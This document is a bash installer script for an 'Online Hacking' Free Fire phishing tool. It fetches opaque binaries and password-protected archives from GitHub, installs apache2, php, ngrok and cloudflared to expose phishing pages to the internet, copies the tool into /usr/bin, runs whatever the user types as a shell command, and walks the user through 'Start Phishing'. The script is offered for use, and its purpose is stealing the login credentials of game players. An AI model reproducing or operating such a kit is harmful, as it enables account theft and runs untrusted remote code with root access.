#!/bin/bash
echo ""
clear
echo ""
echo -e ""
rm -rf FreeFire-Phishing
wget -q --show-progress https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/FreeFire/SM/FreeFire-Phishing
clear
echo ""

logo() {
echo -e ""
echo -e "\e[33m
███████ ██████  ███████ ███████ 
██      ██   ██ ██      ██      
█████   ██████  █████   █████   
██      ██   ██ ██      ██      
██      ██   ██ ███████ ███████                                 
                                
      ███████ ██ ██████  ███████      
      ██      ██ ██   ██ ██           
      █████   ██ ██████  █████        
      ██      ██ ██   ██ ██           
      ██      ██ ██   ██ ███████      
                                       
  \e[0m\n"
}

logo2() {
echo -e ""
echo -e "\e[92m 
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
  echo""
  
  }
  

download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			cp -f $output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			cp -f $output > /dev/null 2>&1
		else
			cp -f $file > /dev/null 2>&1
		fi
		chmod +x $output $file > /dev/null 2>&1
		rm -rf file1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}


install_ngrok() {
	if [[ -e "ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}


install_cloudflared() {
	if [[ -e "cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}




ngroktoken() {
echo ""
echo -e "\e[93m 
 ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
 ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
         ░       ░    ░         ░ ░  ░  ░   
\e[0m\n"
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'y'* ]]; then
clear
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
echo ""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
echo ""
read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token \e[91m[Ex. \e[92mngrok config add-authtoken 1ahJYl6... \e[92m] : \e[0m' token
$token
echo ""
fi
if [[ $option == *'n'* ]]; then
clear
fi
}

uninstall() {
echo -e ""
rm -rf /usr/bin/ngrok
rm -rf /usr/bin/cloudflared
rm -rf /usr/bin/.SUMAN/1 /usr/bin/.SUMAN/2 /usr/bin/.SUMAN/3 /usr/bin/.SUMAN/4 /usr/bin/.SUMAN/5 /usr/bin/.SUMAN/6 /usr/bin/.SUMAN/7 /usr/bin/.SUMAN/8 /usr/bin/.SUMAN/9 /usr/bin/.SUMAN/0
rm -rf /usr/bin/FF
rm -rf /usr/bin/FreeFire
rm -rf /usr/bin/FreeFire-Phishing
rm -rf /usr/bin/OnlineHacking
echo -e ""
}

welcome() {
echo -e ""
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!          Follow Step by Step         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo ""
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
echo ""
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Phishing Page File  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
sleep 5
clear
echo ""
echo ""
echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Script for Android \e[m \e[21"
echo ""
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       Welcome to Online HacKing      !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://www.hacktube.xyz/v/  "
echo ""
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to continue : \e[0m' option
echo""
echo""
echo ""
echo ""
clear
}



echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The FREE FIRE MAX Phishing Tool Please Wait....  \e[0m"
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!             KEY REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
echo -e "\e[33m
      ██╗  ██╗███████╗██╗   ██╗
      ██║ ██╔╝██╔════╝╚██╗ ██╔╝
      █████╔╝ █████╗   ╚████╔╝
      ██╔═██╗ ██╔══╝    ╚██╔╝
      ██║  ██╗███████╗   ██║
      ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Copy Activation Key \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://tinyurl.com/Free-Fire-Key  "
echo ""
echo ""
read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to Continue : \e[0m' option
echo""
echo""
echo""
if [[ $option == *''* ]]; then
clear
echo ""
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Free Fire Phishing Tool Please Wait....  \e[0m"
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
echo ""
sudo apt install apache2 -y
sudo apt install php -y
sudo apt install tail -y
sudo apt install curl -y
sudo apt install unrar -y
sudo apt install unzip -y
sudo apt install ruby -y
gem install lolcat
sudo apt install wget -y
clear
echo""
logo2
echo""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
install_ngrok
rm -rf ngrok-v3*.tgz
echo ""
install_cloudflared
mv cloudflared-li* cloudflared
chmod +x cloudflared ngrok
sleep 1
echo""
clear
echo ""
logo
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;96m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN.rar -O SUMAN.rar
wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN-MAX.rar -O SUMAN-MAX.rar
unrar x -Password SUMAN.rar
unrar x -Password SUMAN-MAX.rar
rm -rf SUMAN.rar
rm -rf SUMAN-MAX.rar
chmod +x ngrok
chmod +x cloudflared
chmod +x FF
chmod +x FreeFire
clear

ngroktoken

echo
cp -R cloudflared ngrok .SUMAN/1/
cp -R cloudflared ngrok .SUMAN/2/
cp -R cloudflared ngrok .SUMAN/3/
cp -R cloudflared ngrok .SUMAN/4/
cp -R cloudflared ngrok .SUMAN/5/
cp -R cloudflared ngrok .SUMAN/6/
cp -R cloudflared ngrok .SUMAN/7/
cp -R cloudflared ngrok .SUMAN/8/
cp -R cloudflared ngrok .SUMAN/9/
cp -R cloudflared ngrok .SUMAN/0/
chmod 7777 FreeFire-Phishing
clear
echo
uninstall
echo
cp -R ngrok /usr/bin/
cp -R cloudflared-linux-386 /usr/bin/
cp -R .SUMAN /usr/bin/
cp -R FreeFire /usr/bin/
cp -R FreeFire-Phishing /usr/bin/
cp -R FF /usr/bin/
cp -R OnlineHacking /usr/bin/
clear
echo
logo
echo
echo -e "\e[35m[+] Connect Online Hacking FREE FIRE Hacking Server (CyberPlane)......  \e[m "
sleep 5
echo
echo
clear
logo2
echo
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
sleep 4
echo
echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Ready \e[m \e[21"
echo
echo
echo -e "\e[92m[+] Open New type this command:\e[93m FreeFire-Phishing \e[m "
echo
fi

echo
rm -rf Linux-Setup.sh .SUMAN
sleep 2
echo
exit
